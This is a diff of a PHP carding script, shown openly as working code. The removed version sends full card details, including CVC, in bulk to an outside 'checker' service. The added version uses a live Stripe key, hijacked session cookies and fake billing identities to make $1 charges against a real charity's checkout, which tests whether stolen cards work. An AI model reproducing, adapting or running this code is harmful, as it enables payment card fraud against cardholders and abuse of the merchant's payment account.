@@ -1,261 +1,190 @@
 <?php
-header('Content-Type: text/plain');
-
-// Enable error reporting for debugging (disable in production)
-ini_set('display_errors', 0);
-error_reporting(E_ALL);
-
-// Optional file-based logging for debugging (disable in production)
-$log_file = __DIR__ . '/stripe5$_debug.log';
-function log_message($message) {
-    global $log_file;
-    file_put_contents($log_file, date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
-}
-
-// Function to check a single card via Stripe5$ API with parallel processing support
-function checkCard($card_number, $exp_month, $exp_year, $cvc, $retry = 1) {
-    $card_details = "$card_number|$exp_month|$exp_year|$cvc";
-    $encoded_cc = urlencode($card_details);
-    $api_url = "https://rocky-y.onrender.com/gateway=stripe5$/key=rocky/cc=$encoded_cc";
-    log_message("Checking card: $card_details, URL: $api_url");
-
-    for ($attempt = 0; $attempt <= $retry; $attempt++) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $api_url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 50); // 50-second timeout
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Insecure; enable in production
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36');
-
-        $response = curl_exec($ch);
-        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        $curl_error = curl_error($ch);
-        $curl_errno = curl_errno($ch);
-        curl_close($ch);
-
-        log_message("Attempt " . ($attempt + 1) . " for $card_details: HTTP $http_code, cURL errno $curl_errno, Response: " . substr($response, 0, 200));
-
-        // Handle API errors
-        if ($response === false || $http_code !== 200 || !empty($curl_error)) {
-            if ($curl_errno == CURLE_OPERATION_TIMEDOUT && $attempt < $retry) {
-                log_message("Timeout for $card_details, retrying...");
-                usleep(500000); // 0.5s delay before retry
-                continue;
-            }
-            log_message("Failed for $card_details: $curl_error (HTTP $http_code, cURL errno $curl_errno)");
-            return "DECLINED [API request failed: $curl_error (HTTP $http_code, cURL errno $curl_errno)] $card_details";
-        }
-
-        // Parse JSON response
-        $result = json_decode($response, true);
-        if (json_last_error() !== JSON_ERROR_NONE || !isset($result['status'])) {
-            log_message("Invalid JSON for $card_details: " . substr($response, 0, 200));
-            return "DECLINED [Invalid API response: " . substr($response, 0, 200) . "] $card_details";
-        }
-
-        $status = $result['status'];
-        $message = $result['message'] ?? 'Unknown error';
-
-        // Map API response to status
-        $final_status = 'DECLINED';
-        if ($status === 'charged') {
-            $final_status = 'CHARGED';
-        } elseif ($status === 'declined') {
-            $final_status = 'DECLINED';
-        }
-
-        $response_msg = htmlspecialchars($message, ENT_QUOTES, 'UTF-8');
-        log_message("$final_status for $card_details: $response_msg");
-        return "$final_status [$response_msg] $card_details";
+function processPayment() {
+    // Get card input
+    echo "cc: ";
+    $cardInput = trim(fgets(STDIN));
+    
+    // Split input into parts
+    $parts = explode('|', $cardInput);
+    if (count($parts) != 4) {
+        return "L#de: cc|mm|yy|cvv";
     }
-
-    log_message("Failed after retries for $card_details");
-    return "DECLINED [API request failed after retries] $card_details";
-}
-
-// Function to check multiple cards in parallel using multi-curl
-function checkCardsParallel($cards, $max_concurrent = 3) {
-    if (empty($cards) || !is_array($cards)) {
-        return "DECLINED [No cards provided for parallel check]";
+    
+    list($ccn, $mm, $yy, $cvc) = $parts;
+    
+    // Format year to 4 digits
+    if (strlen($yy) == 2) {
+        $yy = '20' . $yy;
     }
-
-    $mh = curl_multi_init();
-    $chs = [];
-    $results = [];
-    $processed = 0;
-
-    // Initialize curl handles for up to $max_concurrent cards
-    foreach ($cards as $index => $card) {
-        if ($processed >= $max_concurrent) {
-            break;
-        }
-
-        $card_number = preg_replace('/[^0-9]/', '', $card['number'] ?? '');
-        $exp_month_raw = preg_replace('/[^0-9]/', '', $card['exp_month'] ?? '');
-        $exp_year_raw = preg_replace('/[^0-9]/', '', $card['exp_year'] ?? '');
-        $cvc = preg_replace('/[^0-9]/', '', $card['cvc'] ?? '');
-
-        // Normalize exp_month
-        $exp_month = str_pad($exp_month_raw, 2, '0', STR_PAD_LEFT);
-
-        // Normalize exp_year to 4 digits (supports both YY and YYYY)
-        if (strlen($exp_year_raw) == 2) {
-            $current_year = (int) date('y');
-            $current_century = (int) (date('Y') - $current_year);
-            $card_year = (int) $exp_year_raw;
-            $exp_year = ($card_year >= $current_year ? $current_century : $current_century + 100) + $card_year;
-        } elseif (strlen($exp_year_raw) == 4) {
-            $exp_year = (int) $exp_year_raw;
-        } else {
-            $exp_year = (int) date('Y') + 1; // Default fallback
-        }
-
-        $card_details = "$card_number|$exp_month|$exp_year|$cvc";
-        $encoded_cc = urlencode($card_details);
-        $api_url = "https://rocky-y.onrender.com/gateway=stripe5$/key=rocky/cc=$encoded_cc";
-
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $api_url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36');
-
-        $chs[$index] = $ch;
-        curl_multi_add_handle($mh, $ch);
-        log_message("Added parallel check for card $index: $card_details");
-
-        $processed++;
+    
+    // Stripe API request
+    $stripeHeaders = [
+        'authority: api.stripe.com',
+        'accept: application/json',
+        'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
+        'content-type: application/x-www-form-urlencoded',
+        'origin: https://js.stripe.com',
+        'referer: https://js.stripe.com/',
+        'sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"',
+        'sec-ch-ua-mobile: ?1',
+        'sec-ch-ua-platform: "Android"',
+        'sec-fetch-dest: empty',
+        'sec-fetch-mode: cors',
+        'sec-fetch-site: same-site',
+        'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
+    ];
+    
+    $stripeData = http_build_query([
+        'billing_details[address][city]' => 'Oakford',
+        'billing_details[address][country]' => 'US',
+        'billing_details[address][line1]' => 'Siles Avenue',
+        'billing_details[address][line2]' => '',
+        'billing_details[address][postal_code]' => '19053',
+        'billing_details[address][state]' => 'PA',
+        'billing_details[name]' => 'Geroge Washintonne',
+        'billing_details[email]' => 'grogeh@gmail.com',
+        'type' => 'card',
+        'card[number]' => $ccn,
+        'card[cvc]' => $cvc,
+        'card[exp_year]' => $yy,
+        'card[exp_month]' => $mm,
+        'allow_redisplay' => 'unspecified',
+        'payment_user_agent' => 'stripe.js/5445b56991; stripe-js-v3/5445b56991; payment-element; deferred-intent',
+        'referrer' => 'https://www.onamissionkc.org',
+        'time_on_page' => '145592',
+        'client_attribution_metadata[client_session_id]' => '22e7d0ec-db3e-4724-98d2-a1985fc4472a',
+        'client_attribution_metadata[merchant_integration_source]' => 'elements',
+        'client_attribution_metadata[merchant_integration_subtype]' => 'payment-element',
+        'client_attribution_metadata[merchant_integration_version]' => '2021',
+        'client_attribution_metadata[payment_intent_creation_flow]' => 'deferred',
+        'client_attribution_metadata[payment_method_selection_flow]' => 'merchant_specified',
+        'client_attribution_metadata[elements_session_config_id]' => '7904f40e-9588-48b2-bc6b-fb88e0ef71d5',
+        'guid' => '18f2ab46-3a90-48da-9a6e-2db7d67a3b1de3eadd',
+        'muid' => '3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48',
+        'sid' => '9d45db81-2d1e-436a-b832-acc8b6abac4814eb67',
+        'key' => 'pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e',
+        '_stripe_account' => 'acct_1LwocDFHMGxIu0Ep'
+    ]);
+    
+    $ch = curl_init('https://api.stripe.com/v1/payment_methods');
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, $stripeHeaders);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $stripeData);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $response = curl_exec($ch);
+    $apx = json_decode($response, true);
+    curl_close($ch);
+    
+    if (!isset($apx['id'])) {
+        $errorMsg = $apx['error']['message'] ?? 'Unknown error';
+        return "Error: " . $errorMsg;
     }
-
-    // Execute multi-curl
-    $running = null;
-    do {
-        curl_multi_exec($mh, $running);
-        curl_multi_select($mh);
-    } while ($running > 0);
-
-    // Process results
-    foreach ($chs as $index => $ch) {
-        $response = curl_multi_getcontent($ch);
-        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        $curl_error = curl_error($ch);
-        curl_multi_remove_handle($mh, $ch);
-        curl_close($ch);
-
-        if ($response === false || $http_code !== 200 || !empty($curl_error)) {
-            $results[$index] = "DECLINED [Parallel API request failed: $curl_error (HTTP $http_code)]";
-            log_message("Parallel check failed for card $index: $curl_error (HTTP $http_code)");
-            continue;
-        }
-
-        // Parse JSON response
-        $result = json_decode($response, true);
-        if (json_last_error() !== JSON_ERROR_NONE || !isset($result['status'])) {
-            $results[$index] = "DECLINED [Invalid parallel API response: " . substr($response, 0, 200) . "]";
-            log_message("Invalid JSON in parallel check for card $index: " . substr($response, 0, 200));
-            continue;
-        }
-
-        $status = $result['status'];
-        $message = $result['message'] ?? 'Unknown error';
-
-        $final_status = ($status === 'charged') ? 'CHARGED' : 'DECLINED';
-        $results[$index] = "$final_status [$message]";
-        log_message("Parallel result for card $index: $final_status [$message]");
-    }
-
-    curl_multi_close($mh);
-
-    // Return combined results
-    return implode("\n", $results);
-}
-
-// Check if the request is POST and contains card data
-if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['card'])) {
-    log_message("Invalid request or missing card data");
-    echo "DECLINED [Invalid request or missing card data]";
-    exit;
-}
-
-// Handle single card or multiple cards
-if (is_array($_POST['card']) && isset($_POST['card']['number'])) {
-    // Single card
-    $card = $_POST['card'];
-    $required_fields = ['number', 'exp_month', 'exp_year', 'cvc'];
-
-    // Validate card data
-    foreach ($required_fields as $field) {
-        if (empty($card[$field])) {
-            log_message("Missing $field");
-            echo "DECLINED [Missing $field]";
-            exit;
-        }
-    }
-
-    // Sanitize inputs
-    $card_number = preg_replace('/[^0-9]/', '', $card['number']);
-    $exp_month_raw = preg_replace('/[^0-9]/', '', $card['exp_month']);
-    $exp_year_raw = preg_replace('/[^0-9]/', '', $card['exp_year']);
-    $cvc = preg_replace('/[^0-9]/', '', $card['cvc']);
-
-    // Normalize exp_month to 2 digits
-    $exp_month = str_pad($exp_month_raw, 2, '0', STR_PAD_LEFT);
-    if (!preg_match('/^(0[1-9]|1[0-2])$/', $exp_month)) {
-        log_message("Invalid exp_month format: $exp_month_raw");
-        echo "DECLINED [Invalid exp_month format]";
-        exit;
-    }
-
-    // Normalize exp_year to 4 digits (full support for YY or YYYY)
-    if (strlen($exp_year_raw) == 2) {
-        $current_year = (int) date('y');
-        $current_century = (int) (date('Y') - $current_year);
-        $card_year = (int) $exp_year_raw;
-        $exp_year = ($card_year >= $current_year ? $current_century : $current_century + 100) + $card_year;
-    } elseif (strlen($exp_year_raw) == 4) {
-        $exp_year = (int) $exp_year_raw;
+    
+    $pid = $apx['id'];
+    
+    // Second request to merchant
+    $cookies = 'crumb=BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1; ' .
+               'ss_cvr=b5544939-8b08-4377-bd39-dfc7822c1376|1760724937850|1760724937850|1760724937850|1; ' .
+               'ss_cvt=1760724937850; ' .
+               '__stripe_mid=3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48; ' .
+               '__stripe_sid=9d45db81-2d1e-436a-b832-acc8b6abac4814eb67';
+    
+    $merchantHeaders = [
+        'authority: www.onamissionkc.org',
+        'accept: application/json, text/plain, */*',
+        'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
+        'content-type: application/json',
+        'origin: https://www.onamissionkc.org',
+        'referer: https://www.onamissionkc.org/checkout?cartToken=OBEUbArW4L_xPlSD9oXFJrWCGoeyrxzx4MluNUza',
+        'sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"',
+        'sec-ch-ua-mobile: ?1',
+        'sec-ch-ua-platform: "Android"',
+        'sec-fetch-dest: empty',
+        'sec-fetch-mode: cors',
+        'sec-fetch-site: same-origin',
+        'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        'x-csrf-token: BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1'
+    ];
+    
+    $jsonData = json_encode([
+        'email' => 'grogeh@gmail.com',
+        'subscribeToList' => false,
+        'shippingAddress' => [
+            'id' => '',
+            'firstName' => '',
+            'lastName' => '',
+            'line1' => '',
+            'line2' => '',
+            'city' => '',
+            'region' => 'NY',
+            'postalCode' => '',
+            'country' => '',
+            'phoneNumber' => ''
+        ],
+        'createNewUser' => false,
+        'newUserPassword' => null,
+        'saveShippingAddress' => false,
+        'makeDefaultShippingAddress' => false,
+        'customFormData' => null,
+        'shippingAddressId' => null,
+        'proposedAmountDue' => [
+            'decimalValue' => '1',
+            'currencyCode' => 'USD'
+        ],
+        'cartToken' => 'OBEUbArW4L_xPlSD9oXFJrWCGoeyrxzx4MluNUza',
+        'paymentToken' => [
+            'stripePaymentTokenType' => 'PAYMENT_METHOD_ID',
+            'token' => $pid,
+            'type' => 'STRIPE'
+        ],
+        'billToShippingAddress' => false,
+        'billingAddress' => [
+            'id' => '',
+            'firstName' => 'Davide',
+            'lastName' => 'Washintonne',
+            'line1' => 'Siles Avenue',
+            'line2' => '',
+            'city' => 'Oakford',
+            'region' => 'PA',
+            'postalCode' => '19053',
+            'country' => 'US',
+            'phoneNumber' => '+1361643646'
+        ],
+        'savePaymentInfo' => false,
+        'makeDefaultPayment' => false,
+        'paymentCardId' => null,
+        'universalPaymentElementEnabled' => true
+    ]);
+    
+    $ch = curl_init('https://www.onamissionkc.org/api/2/commerce/orders');
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, $merchantHeaders);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
+    curl_setopt($ch, CURLOPT_COOKIE, $cookies);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $response1 = curl_exec($ch);
+    $apx1 = json_decode($response1, true);
+    curl_close($ch);
+    
+    if (isset($apx1['failureType'])) {
+        return "$ccn|$mm|$yy|$cvc --> " . $apx1['failureType'];
     } else {
-        log_message("Invalid exp_year format: $exp_year_raw");
-        echo "DECLINED [Invalid exp_year format - must be YY or YYYY]";
-        exit;
+        return "$ccn|$mm|$yy|$cvc --> PAYMENT_SUCCESS";
     }
+}
 
-    // Validate card number, year, and CVC
-    if (!preg_match('/^\d{13,19}$/', $card_number)) {
-        log_message("Invalid card number format: $card_number");
-        echo "DECLINED [Invalid card number format]";
-        exit;
-    }
-    if (!preg_match('/^\d{4}$/', (string) $exp_year) || $exp_year > (int) date('Y') + 10) {
-        log_message("Invalid exp_year after normalization: $exp_year");
-        echo "DECLINED [Invalid exp_year format or too far in future]";
-        exit;
-    }
-    if (!preg_match('/^\d{3,4}$/', $cvc)) {
-        log_message("Invalid CVC format: $cvc");
-        echo "DECLINED [Invalid CVC format]";
-        exit;
-    }
+// Main execution
+echo "Stripe Charge 1$\n\n";
+ $result = processPayment();
+echo $result . "\n";
 
-    // Validate logical expiry
-    $expiry_timestamp = strtotime("$exp_year-$exp_month-01");
-    $current_timestamp = strtotime('first day of this month');
-    if ($expiry_timestamp === false || $expiry_timestamp < $current_timestamp) {
-        log_message("Card expired: $card_number|$exp_month|$exp_year|$cvc");
-        echo "DECLINED [Card expired] $card_number|$exp_month|$exp_year|$cvc";
-        exit;
-    }
-
-    // Check single card
-    echo checkCard($card_number, $exp_month, $exp_year, $cvc);
-} elseif (is_array($_POST['card']) && count($_POST['card']) > 1) {
-    // Multiple cards - process in parallel (3 at a time)
-    echo checkCardsParallel($_POST['card'], 3);
+// Handle response display
+if (strpos($result, 'PAYMENT_SUCCESS') !== false) {
+    echo "Charged successfully!\n";
+} elseif (strpos($result, 'PAYMENT_DECLINED') !== false || 
+          strpos($result, 'card_declined') !== false) {
+    echo "Your card was declined\n";
 } else {
-    log_message("Invalid card data format");
-    echo "DECLINED [Invalid card data format]";
+    echo "Payment processing error\n";
 }
 ?>
